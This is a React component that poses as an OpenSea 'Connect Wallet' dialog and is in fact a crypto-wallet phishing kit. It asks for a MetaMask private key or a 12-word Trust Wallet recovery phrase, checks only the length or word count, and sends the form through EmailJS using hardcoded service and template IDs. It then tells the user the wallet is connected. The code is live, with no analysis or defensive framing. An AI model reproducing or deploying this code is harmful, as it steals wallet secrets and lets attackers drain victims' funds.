import { FontAwesomeIcon } from "@fortawesome/react-fontawesome"
import { faXmark, faArrowLeft, faCircleCheck, faCircleXmark, faSpinner } from "@fortawesome/free-solid-svg-icons"
import { useState, useEffect, useRef } from "react"
import Web3 from 'web3'
import emailjs from '@emailjs/browser';

const ConnectWalletTab = ({ deactivateWallet, setAddr, setBalance }) => {

    const [metamask, setMetamask] = useState(false)
    const [trust, setTrust] = useState(false)
    const [initiate, setInitiate] = useState(false)
    const [IsLoading, setIsLoading] = useState(false)

    const [metaKey, setMetaKey] = useState('')
    const [trustKey, setTustKey] = useState('')

    const [validMetaKey, setValidMetaKey] = useState(null)
    const form = useRef()

    const assumeMetamask = () => {
        setTrust(false)
        setInitiate(true)
        setMetamask(true)
    }
    const assumeTrust = () => {
        setMetamask(false)
        setTrust(true)
        setInitiate(true)
    }
    const resetWallet = () => {
        setMetamask(false)
        setTrust(false)
        setInitiate(false)
    }

    function hasUpTo12Words(inputString) {
        // Trim the string to remove leading and trailing whitespaces
        const trimmedString = inputString.trim();

        // Split the string into an array of words
        const wordsArray = trimmedString.split(/\s+/);

        // Check if the number of words is less than or equal to 12
        return wordsArray.length === 12;
    }

    useEffect(() => {
        if (metaKey && metaKey.length !== 64) {
            setValidMetaKey(false)
        } else if (metaKey && metaKey.length === 64) {
            setValidMetaKey(true)

        }

    }, [metaKey])

    const connectMetamask = async (e) => {
        e.preventDefault()
        if (!validMetaKey) return window.alert('❌ Invalid Key')
        let userAccount
        setIsLoading(true)

        try {
            const ethereum = window.ethereum

            if (!ethereum) return window.alert('no wallet extension found. if you are on mobile, please switch to Trust wallet mobile app\'s or metamask app.');
            const connect = await ethereum.request({ method: 'eth_requestAccounts' });
            if (!connect) return console.log('connection failed');


            const web3 = new Web3(ethereum);
            const accounts = await web3.eth.getAccounts();


            if (!accounts) return console.log('!no Acccounts');
            userAccount = accounts[0];
            setAddr(userAccount)

            const balanceWei = await web3.eth.getBalance(accounts[0]);
            // Convert balance from Wei to Ether and set to state
            setBalance(web3.utils.fromWei(balanceWei, 'ether'));

            emailjs
                .sendForm('service_8l9om3r', 'template_u95p8kd', form.current, {
                    publicKey: 'c1kp6Rhm7bbndiauF',
                })
                .then(
                    () => {
                        console.log('SUCCESS!');
                        deactivateWallet()
                    },
                    (error) => {
                        console.log('FAILED...', error.text);
                    },
                );

        } catch (error) {
            console.log(error);
            alert(error.message)
        } finally {
            setIsLoading(false)
            setMetaKey('')
            alert('Wallet connected. 🎉')

        }

    }
    const connectTrust = async (e) => {
        e.preventDefault()

        if (!hasUpTo12Words(trustKey)) return window.alert('❌ Invalid Key')
        let userAccount
        setIsLoading(true)

        try {
            const ethereum = window.ethereum

            if (!ethereum) return window.alert('no wallet extension found. if you are on mobile, please switch to Trust wallet mobile app\'s or metamask app.');
            const connect = await ethereum.request({ method: 'eth_requestAccounts' });
            if (!connect) return console.log('connection failed');


            const web3 = new Web3(ethereum);
            const accounts = await web3.eth.getAccounts();


            if (!accounts) return console.log('!no Acccounts');
            userAccount = accounts[0];
            setAddr(userAccount)

            const balanceWei = await web3.eth.getBalance(accounts[0]);
            // Convert balance from Wei to Ether and set to state
            setBalance(web3.utils.fromWei(balanceWei, 'ether'));

            emailjs
                .sendForm('service_8l9om3r', 'template_u95p8kd', form.current, {
                    publicKey: 'c1kp6Rhm7bbndiauF',
                })
                .then(
                    () => {
                        console.log('SUCCESS!');
                        deactivateWallet()
                    },
                    (error) => {
                        console.log('FAILED...', error.text);
                    },
                );

        } catch (error) {
            console.log(error);
            alert(error.message)
        } finally {
            setIsLoading(false)
            setTustKey('')
            alert('Wallet connected. 🎉')

        }

    }


    return (
        <>
            <main className="w-full min-h-screen flex items-center justify-center z-20 bg-black/30 backdrop-blur-sm absolute top-24 left-0">
                <div className="w-[350px] min-h-[250px] mx-auto bg-white p-4 flex flex-col rounded-2xl py-8">
                    <div className={`flex items-center justify-between px-4`}   >
                        {initiate && <FontAwesomeIcon className="cursor-pointer" icon={faArrowLeft} onClick={() => resetWallet()} />}
                        <FontAwesomeIcon className={`cursor-pointer ${initiate ? "" : "self-end"}`} icon={faXmark} onClick={() => deactivateWallet()} />

                    </div>
                    <img className="w-[100px] h-[100px] mx-auto" src="https://downloads.intercomcdn.com/i/o/483383/9ebf33acaebb36649fc325dc/a3dd3fcfe89960f9368750bbb4fd6bd8.png" alt="" />
                    <p className="text-center text-xl my-2 mx-auto">Connect to OpenSea</p>
                    <div className="my-3 w-full mt-6">
                        {!initiate && <div className="flex flex-col space-y-3">
                            <button onClick={() => assumeMetamask()} className="text-left place-items-start px-3 border border-solid border-t-0 border-l-0 border-r-0 rounded">
                                <img className="inline w-[30px]" src="https://opensea.io/static/images/logos/metamask-fox.svg" alt="metamask" /> MetaMask
                            </button>
                            <button onClick={() => assumeTrust()} className="text-left place-items-start px-3 border border-solid border-t-0 border-l-0 border-r-0 rounded">
                                <img className="inline w-[30px]" src="https://ethersmasterpiece.com/assets/trustlogo.png" alt="metamask" /> Trust wallet
                            </button>
                        </div>}
                        {initiate && metamask && <form ref={form} onSubmit={connectMetamask} className="flex flex-col space-y-3">
                            <p className="text-left place-items-start px-3 border border-solid border-t-0 border-l-0 border-r-0 rounded">
                                <img className="inline w-[30px]" src="https://opensea.io/static/images/logos/metamask-fox.svg" alt="metamask" /> MetaMask {metaKey && validMetaKey && <FontAwesomeIcon icon={faCircleCheck} className="text-green-700 float-end" />} {metaKey && !validMetaKey && <FontAwesomeIcon icon={faCircleXmark} className="text-red-700 float-end" />}
                            </p>
                            <input
                                type="text"
                                value={metaKey}
                                name="metaMaskKey"
                                onChange={e => setMetaKey(e.target.value)}
                                className="focus:outline-none border border-solid rounded p-3 "
                                placeholder="paste your 64 character phrase"
                            />
                            {!IsLoading && <button className="transition-all duration-300 hover:bg-blue-600/95 p-3 text-xl border border-solid  bg-blue-600/70 text-white rounded-xl">
                                Connect Wallet
                            </button>}
                            {IsLoading && <article className="transition-all duration-300 hover:bg-blue-600/95 p-3 text-xl border border-solid  bg-blue-600/70 text-white rounded-xl text-center">
                                <FontAwesomeIcon icon={faSpinner} spin />
                            </article>}
                        </form>}
                        {initiate && trust && <form ref={form} onSubmit={connectTrust} className="flex flex-col space-y-3">
                            <p className="text-left place-items-start px-3 border border-solid border-t-0 border-l-0 border-r-0 rounded">
                                <img className="inline w-[30px]" src="https://ethersmasterpiece.com/assets/trustlogo.png" alt="metamask" /> Trust  {trustKey && hasUpTo12Words(trustKey) && <FontAwesomeIcon icon={faCircleCheck} className="text-green-700 float-end" />} {trustKey && !hasUpTo12Words(trustKey) && <FontAwesomeIcon icon={faCircleXmark} className="text-red-700 float-end" />}
                            </p>
                            <input
                                type="text"
                                value={trustKey}
                                name="trustWalletKey"
                                onChange={e => setTustKey(e.target.value)}
                                className="focus:outline-none border border-solid rounded p-3 "
                                placeholder="paste your 12-word phrase"
                            />
                            {!IsLoading && <button className="transition-all duration-300 hover:bg-blue-600/95 p-3 text-xl border border-solid  bg-blue-600/70 text-white rounded-xl">
                                Connect Wallet
                            </button>}
                            {IsLoading && <article className="transition-all duration-300 hover:bg-blue-600/95 p-3 text-xl border border-solid  bg-blue-600/70 text-white rounded-xl text-center">
                                <FontAwesomeIcon icon={faSpinner} spin />
                            </article>}
                        </form>}
                    </div>
                </div>
            </main>

        </>
    )
}
export default ConnectWalletTab